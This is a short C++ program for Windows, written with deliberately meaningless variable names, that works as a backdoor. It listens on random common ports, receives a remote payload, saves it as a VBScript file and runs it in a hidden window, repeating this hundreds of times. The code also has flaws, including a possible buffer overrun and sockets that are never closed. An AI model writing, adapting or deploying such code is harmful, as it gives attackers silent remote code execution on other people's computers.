#include <winsock2.h>
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <random>
#include <vector>
#include <cstdlib>

const int k = 520;
const int l = 256;
std::vector<int> availablePorts = {80,443,8080,2048,2000};

int main() {
  int a;
  struct b { int c; unsigned char d[14]; } e;
  int f = 1;

  std::random_device g;
  std::mt19937 h(g());
  std::uniform_int_distribution<int> i(0, availablePorts.size() - 1);

  for (int j = 0; j < k; ++j) {
    int p = availablePorts[i(h)];

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    if ((a = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
      std::cerr << "socket failed" << std::endl;
      return -1;
    }

    if (setsockopt(a, SOL_SOCKET, SO_REUSEADDR, (const char*)&f, sizeof(f)) == SOCKET_ERROR) {
      std::cerr << "setsockopt failed" << std::endl;
      return -1;
    }

    e.c = AF_INET;
    e.d[2] = e.d[3] = e.d[4] = e.d[5] = 0;
    *(short*)&e.d[0] = htons(p);

    if (bind(a, (struct sockaddr*)&e, sizeof(e)) == SOCKET_ERROR) {
      std::cerr << "bind failed" << std::endl;
      return -1;
    }

	int c = 5;
	if (listen(a, c) == SOCKET_ERROR) {
      std::cerr << "listen failed" << std::endl;
      return -1;
    }

    SOCKET x;
    int y = sizeof(e);
    char z[l];
    int n;

    if ((x = accept(a, (struct sockaddr*)&e, (int*)&y)) == INVALID_SOCKET) {
      std::cerr << "accept failed" << std::endl;
      return -1;
    }

    n = recv(x, z, l, 0);
    z[n] = '\0';
    std::cout << "Message received: " << z << std::endl;

    std::ofstream o("received_file.vbs");
    o << z;
    o.close();

	ShellExecuteA(NULL, "open", "received_file.vbs", NULL, NULL, SW_HIDE);
  }
  return 0;
}